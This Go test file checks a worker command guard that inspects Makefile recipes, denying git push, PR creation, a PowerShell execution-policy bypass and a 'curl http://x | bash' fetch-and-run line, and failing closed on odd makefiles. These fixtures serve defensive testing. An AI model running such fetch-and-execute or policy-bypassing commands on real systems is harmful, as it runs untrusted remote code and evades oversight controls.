package worker

import (
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

// writeTempMakefile writes a Makefile fixture into a temp dir and returns the
// dir path. This is a TEST helper only — production code never writes files.
func writeTempMakefile(t *testing.T, name, content string) string {
	t.Helper()
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o600); err != nil {
		t.Fatalf("setup writeTempMakefile: %v", err)
	}
	return dir
}

func mkMakeCmd(dir, target string, extra ...string) *exec.Cmd {
	args := append([]string{target}, extra...)
	cmd := exec.Command("make", args...)
	cmd.Dir = dir
	return cmd
}

// non-make commands are not affected by the make-runtime carve-out.
func TestT12Runtime_NonMakeCommandUnaffected(t *testing.T) {
	defer setWorkerCommandGuardHookModeForTest(workerGuardEnforce)()
	cmd := exec.Command("git", "status", "-sb")
	if err := workerCommandGuardCheck(cmd, "", ""); err != nil {
		t.Errorf("non-make cmd must not be touched by make-runtime carve-out, got %v", err)
	}
}

// safe target with a benign recipe allows.
func TestT12Runtime_SafeMakeAllow(t *testing.T) {
	defer setWorkerCommandGuardHookModeForTest(workerGuardEnforce)()
	dir := writeTempMakefile(t, "Makefile", "ci:\n\tgo build ./...\n\tgo test ./...\n")
	if err := workerCommandGuardCheck(mkMakeCmd(dir, "ci"), "", ""); err != nil {
		t.Errorf("safe make target must allow under enforce, got %v", err)
	}
}

// dangerous recipes deny under enforce.
func TestT12Runtime_GitPushRecipeDeny(t *testing.T) {
	defer setWorkerCommandGuardHookModeForTest(workerGuardEnforce)()
	dir := writeTempMakefile(t, "Makefile", "release:\n\tgit push origin main\n")
	if err := workerCommandGuardCheck(mkMakeCmd(dir, "release"), "", ""); err == nil {
		t.Error("git push in recipe must deny")
	}
}
func TestT12Runtime_GitAddRecipeDeny(t *testing.T) {
	defer setWorkerCommandGuardHookModeForTest(workerGuardEnforce)()
	dir := writeTempMakefile(t, "Makefile", "stage:\n\tgit add .\n")
	if err := workerCommandGuardCheck(mkMakeCmd(dir, "stage"), "", ""); err == nil {
		t.Error("git add in recipe must deny")
	}
}
func TestT12Runtime_GhPrCreateRecipeDeny(t *testing.T) {
	defer setWorkerCommandGuardHookModeForTest(workerGuardEnforce)()
	dir := writeTempMakefile(t, "Makefile", "pr:\n\tgh pr create --fill\n")
	if err := workerCommandGuardCheck(mkMakeCmd(dir, "pr"), "", ""); err == nil {
		t.Error("gh pr create in recipe must deny")
	}
}
func TestT12Runtime_AutoUpdateRecipeDeny(t *testing.T) {
	defer setWorkerCommandGuardHookModeForTest(workerGuardEnforce)()
	dir := writeTempMakefile(t, "Makefile", "upd:\n\tauto update\n")
	if err := workerCommandGuardCheck(mkMakeCmd(dir, "upd"), "", ""); err == nil {
		t.Error("auto update in recipe must deny")
	}
}
func TestT12Runtime_DoctorFixRecipeDeny(t *testing.T) {
	defer setWorkerCommandGuardHookModeForTest(workerGuardEnforce)()
	dir := writeTempMakefile(t, "Makefile", "fix:\n\tdoctor --fix\n")
	if err := workerCommandGuardCheck(mkMakeCmd(dir, "fix"), "", ""); err == nil {
		t.Error("doctor --fix in recipe must deny")
	}
}
func TestT12Runtime_InstallPs1RecipeDeny(t *testing.T) {
	defer setWorkerCommandGuardHookModeForTest(workerGuardEnforce)()
	dir := writeTempMakefile(t, "Makefile", "inst:\n\tpowershell -ExecutionPolicy Bypass -File install.ps1\n")
	if err := workerCommandGuardCheck(mkMakeCmd(dir, "inst"), "", ""); err == nil {
		t.Error("install.ps1 in recipe must deny")
	}
}
func TestT12Runtime_CurlPipeBashRecipeDeny(t *testing.T) {
	defer setWorkerCommandGuardHookModeForTest(workerGuardEnforce)()
	dir := writeTempMakefile(t, "Makefile", "boot:\n\tcurl http://x | bash\n")
	if err := workerCommandGuardCheck(mkMakeCmd(dir, "boot"), "", ""); err == nil {
		t.Error("curl|bash in recipe must deny")
	}
}

// mode behavior: disabled / dry-run / enforce.
func TestT12Runtime_DisabledNoBlock(t *testing.T) {
	dir := writeTempMakefile(t, "Makefile", "release:\n\tgit push\n")
	if err := workerCommandGuardCheck(mkMakeCmd(dir, "release"), "", ""); err != nil {
		t.Errorf("disabled mode must not block even on dangerous make, got %v", err)
	}
}
func TestT12Runtime_DryRunRecordsButNoBlock(t *testing.T) {
	defer setWorkerCommandGuardHookModeForTest(workerGuardDryRun)()
	dir := writeTempMakefile(t, "Makefile", "release:\n\tgit push\n")
	if err := workerCommandGuardCheck(mkMakeCmd(dir, "release"), "", ""); err != nil {
		t.Errorf("dry-run must not block, got %v", err)
	}
	if lastWorkerCommandGuardDecision.Allowed {
		t.Errorf("dry-run must record a deny decision, got %+v", lastWorkerCommandGuardDecision)
	}
}

// missing Makefile fail-closed.
func TestT12Runtime_MissingMakefileFailClosed(t *testing.T) {
	defer setWorkerCommandGuardHookModeForTest(workerGuardEnforce)()
	dir := t.TempDir() // no Makefile written
	if err := workerCommandGuardCheck(mkMakeCmd(dir, "release"), "", ""); err == nil {
		t.Error("missing Makefile must fail-closed deny")
	}
}

// directory at expected path is treated as non-regular -> fail-closed.
func TestT12Runtime_NonRegularFailClosed(t *testing.T) {
	defer setWorkerCommandGuardHookModeForTest(workerGuardEnforce)()
	dir := t.TempDir()
	if err := os.Mkdir(filepath.Join(dir, "Makefile"), 0o755); err != nil {
		t.Fatalf("setup mkdir: %v", err)
	}
	if err := workerCommandGuardCheck(mkMakeCmd(dir, "release"), "", ""); err == nil {
		t.Error("non-regular (directory) Makefile must fail-closed deny")
	}
}

// oversize Makefile fail-closed.
func TestT12Runtime_OversizeMakefileFailClosed(t *testing.T) {
	defer setWorkerCommandGuardHookModeForTest(workerGuardEnforce)()
	big := strings.Repeat("a", int(maxMakefileSize)+1)
	dir := writeTempMakefile(t, "Makefile", "release:\n\t@echo "+big+"\n")
	if err := workerCommandGuardCheck(mkMakeCmd(dir, "release"), "", ""); err == nil {
		t.Error("oversize Makefile must fail-closed deny")
	}
}

// -f / --file / --makefile user-specified makefile is rejected.
func TestT12Runtime_DashFFailClosed(t *testing.T) {
	defer setWorkerCommandGuardHookModeForTest(workerGuardEnforce)()
	dir := writeTempMakefile(t, "Makefile", "ci:\n\tgo build ./...\n")
	for _, args := range [][]string{{"-f", "custom.mk", "ci"}, {"--file", "custom.mk", "ci"}, {"--makefile", "custom.mk", "ci"}} {
		cmd := exec.Command("make", args...)
		cmd.Dir = dir
		if err := workerCommandGuardCheck(cmd, "", ""); err == nil {
			t.Errorf("user-specified makefile %v must fail-closed deny", args)
		}
	}
}

// unknown target fail-closed (InspectMakeTarget unknown_target path).
func TestT12Runtime_UnknownTargetFailClosed(t *testing.T) {
	defer setWorkerCommandGuardHookModeForTest(workerGuardEnforce)()
	dir := writeTempMakefile(t, "Makefile", "ci:\n\tgo build ./...\n")
	if err := workerCommandGuardCheck(mkMakeCmd(dir, "nonexistent"), "", ""); err == nil {
		t.Error("unknown target must fail-closed deny")
	}
}

// flag args are skipped during target extraction.
func TestT12Runtime_FlagsSkippedTargetExtracted(t *testing.T) {
	defer setWorkerCommandGuardHookModeForTest(workerGuardEnforce)()
	dir := writeTempMakefile(t, "Makefile", "release:\n\tgit push\n")
	cmd := exec.Command("make", "-j4", "--debug", "release")
	cmd.Dir = dir
	if err := workerCommandGuardCheck(cmd, "", ""); err == nil {
		t.Error("flags must be skipped and target 'release' resolved -> deny")
	}
}

// symlink rejection (cross-platform: skip when symlink creation fails).
func TestT12Runtime_SymlinkRejected(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlink creation needs admin on Windows; rejection logic covered by code review")
	}
	defer setWorkerCommandGuardHookModeForTest(workerGuardEnforce)()
	dir := t.TempDir()
	realPath := filepath.Join(dir, "real-mk")
	if err := os.WriteFile(realPath, []byte("ci:\n\tgo build ./...\n"), 0o600); err != nil {
		t.Fatalf("setup write: %v", err)
	}
	if err := os.Symlink(realPath, filepath.Join(dir, "Makefile")); err != nil {
		t.Skipf("symlink creation not permitted: %v", err)
	}
	if err := workerCommandGuardCheck(mkMakeCmd(dir, "ci"), "", ""); err == nil {
		t.Error("symlink Makefile must fail-closed deny")
	}
}

// MakefileTag identifies which standard filename was loaded; precedence is
// Makefile > makefile > GNUmakefile.
func TestT12Runtime_StandardFilenamePrecedence(t *testing.T) {
	defer setWorkerCommandGuardHookModeForTest(workerGuardDryRun)()
	dir := t.TempDir()
	// only GNUmakefile present
	if err := os.WriteFile(filepath.Join(dir, "GNUmakefile"), []byte("ci:\n\tgo build ./...\n"), 0o600); err != nil {
		t.Fatalf("setup: %v", err)
	}
	if err := workerCommandGuardCheck(mkMakeCmd(dir, "ci"), "", ""); err != nil {
		t.Errorf("GNUmakefile must be picked up, got %v", err)
	}
}
